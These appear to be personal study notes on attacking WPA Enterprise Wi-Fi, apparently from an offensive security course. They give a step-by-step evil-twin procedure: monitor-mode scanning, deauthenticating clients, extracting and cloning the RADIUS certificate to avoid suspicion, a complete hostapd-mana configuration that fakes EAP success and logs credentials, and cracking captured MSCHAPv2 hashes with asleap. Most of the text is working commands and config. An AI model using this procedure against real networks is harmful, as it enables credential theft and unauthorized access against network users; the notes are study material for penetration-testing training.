# Attack [Impt]

- Create rogue AP to match setting of target as closely as possible
- Use hostapd-mana to create rogue AP and match target settings
    - used for capturing credentials to crack later
- Need **freeradius** open source RADIUS server.
    - wont need it for RADIUS capabilities
    - contains scripts which help to generate certificates for hostapd-mana
- Exploit misconfiguration of security settings in client devices OR
- The lack of proper certificate set-up on the RADIUS server OR
- Both

1. Put wlan0 interface in monitor mode and the identify channel of target AP and gather its ESSID and BSSID (SSID and mac-addr)
    
    `sudo airodump-ng wlan0mon`
    
    *to scan the environment*
    
    **When AUTH method is MGT, it means WPA Enterprise!!!**
    
    Which aligns with our goal

    *note:* 
    
    - *usually not necessary, but we will create certificate similar to the one from the RADIUS server that AP serves to its client*
    - *if skipped and reuse ones we had before instead, should still verify they are valid and regenerate those if they arenâ€™t. The default validity of the certificates is 60 days from the time they were generated.*
    - *check the validity of the cert by using `openssl x509 -in CERT_FILENAME -noout -enddate` replace CERT_FILENAME with .pem or .crt file.*
    
2. Restart capture on same channel as AP. To get certificate, deauth the client using `aireplay-ng`
    
    
3. **Auth** will be done again once the clients disconnects
    
    
4. Once airodump-ng indicates handshake captured, can stop capture. 
    1. *Certificate is usually present and can get the certificate from the enterprise authentication that happened before the handshake.*
    2. Disable monitor mode by running
        
        `sudo airmon-ng stop wlan0mon`
        
    
5. Open the capture file in wireshark and locate server certificate frame.
    
    
6. Use this filter `tls.handshake.type == 11` or `tls.handshake.certificate` to show exact frames where certificate given

1. Look at `Extensible Authentication Protocol > Transport Layer Security` 

1. Open `TLSv1 Record Layer: Handshake Protocol: Certificate` (or similar since TLS version vary)

1. Expand `Handshake Protocol: Certificate`

1. Inside there, can see one or more entries named **Certificate**

1. For each Certificate, can right click and select `Export Packet Bytes` to save data into a file with a `.der` extension

1. Certificates exported are in binary form which can be opened in file manager or can display information about them using OpenSSL thru`openssl x509 -inform der -in CERTIFICATE_FILENAME -text` 

1. Can also convert to .pem format using
    
    `openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt`
    
    - whenever prompted to add certificate in trusted root certificate store, request should be carefully examined. as it can have serious consequences on security of system

1. Navigate to **/etc/freeradius/3.0/certs** and change settings of **ca.cnf**
    1. Edit `certificate_authority` match CA certificate to appear less sus to clients jic they inspect certificate
    2. Can also edit **server.cnf** to match **ca.cnf**

1. Regenerate dh
    1. `rm dh`
    2. `make` , will not run if dh is not removed
        1. run `make destroycerts` to clean up
    
2. Create hostapd-mana config file under `/etc/hostapd-mana/mana.conf` 
    
    ```bash
    # SSID of the AP
    ssid=Playtronics
    
    # Network interface to use and driver type
    # We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
    interface=wlan0
    driver=nl80211
    
    # Channel and mode
    # Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
    channel=1
    # Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
    hw_mode=g
    
    # Setting up hostapd as an EAP server
    ieee8021x=1
    eap_server=1
    
    # Key workaround for Win XP
    eapol_key_index_workaround=0
    
    # EAP user file we created earlier
    eap_user_file=/etc/hostapd-mana/mana.eap_user
    
    # Certificate paths created earlier
    ca_cert=/etc/freeradius/3.0/certs/ca.pem
    server_cert=/etc/freeradius/3.0/certs/server.pem
    private_key=/etc/freeradius/3.0/certs/server.key
    # The password is actually 'whatever'
    private_key_passwd=whatever
    dh_file=/etc/freeradius/3.0/certs/dh
    
    # Open authentication
    auth_algs=1
    # WPA/WPA2
    wpa=3 # to indicate both WPA and WPA2
    # WPA Enterprise
    wpa_key_mgmt=WPA-EAP
    # Allow CCMP and TKIP
    # Note: iOS warns when network has TKIP (or WEP)
    wpa_pairwise=CCMP TKIP
    
    # Enable Mana WPE
    mana_wpe=1
    
    # Store credentials in that file
    mana_credout=/tmp/hostapd.credout
    
    # Send EAP success, so the client thinks it's connected
    mana_eapsuccess=1
    
    # EAP TLS MitM
    mana_eaptls=1
    ```
    

1. Create EAP user file referenced in config file, `/etc/hostapd-mana/mana.eap_user`
    
    ```bash
    *     PEAP,TTLS,TLS,FAST
    "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
    ```
    
- first column indicates specific user by username or wildcard character
- second column contains protocols allowed for specific users and authentication phase
- third column optional and used for password when specific user mentioned
- forth column [2] indicated that the settings on this line are for phase 2 authentication

1. after configuring both files, run
    
    `sudo hostapd-mana /etc/hostapd-mana/mana.conf`
    

1. once victim attempts to auth to our AP, login attempt is captured
    
    ![Untitled](Untitled%2040.png)
    
2. credentials will be in /tmp/hostapd.credout

1. use `asleap` to crack password hash. Copy and paste output starting with `asleap` and append the wordlist `/usr/share/john/password.lst` to `-W` parameter
    
    `asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst`
